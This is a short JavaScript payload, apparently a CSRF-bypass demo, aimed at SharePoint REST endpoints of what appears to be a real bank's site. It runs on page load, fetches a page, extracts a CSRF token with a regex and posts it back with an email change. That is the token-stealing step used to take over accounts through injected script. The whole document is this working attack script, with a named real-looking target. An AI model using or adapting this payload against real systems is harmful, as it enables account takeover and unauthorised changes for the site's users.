(function(){
  const GET_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7B63c44e7f%2Dc900%2D437a%2Dbd07%2Da4ff273afc14%7D%27&@a2=%271%27';            // thay nếu cần
  const POST_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7B63c44e7f%2Dc900%2D437a%2Dbd07%2Da4ff273afc14%7D%27&@a2=%271%27'; // thay nếu cần
  const AUTO_RUN = true;

  function run() {
    var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('GET', GET_URL, true);
    req.send();

    function handleResponse() {
      var m = this.responseText.match(/name="csrf" value="([^"]+)"/);
      var token = m ? m[1] : null;
      console.log('extracted token:', token);
      if (!token) return;

      var changeReq = new XMLHttpRequest();
      changeReq.open('POST', POST_URL, true);
      changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      changeReq.onload = function(){ console.log('change response:', changeReq.status, changeReq.responseText); };
      changeReq.send('csrf=' + encodeURIComponent(token) + '&email=test@example.local');
    }
  }

  if (AUTO_RUN) {
    setTimeout(()=> { try { run(); } catch(e) { console.error(e); } }, 50);
  } else {
    window.runCsrfDemo = run;
  }
})();
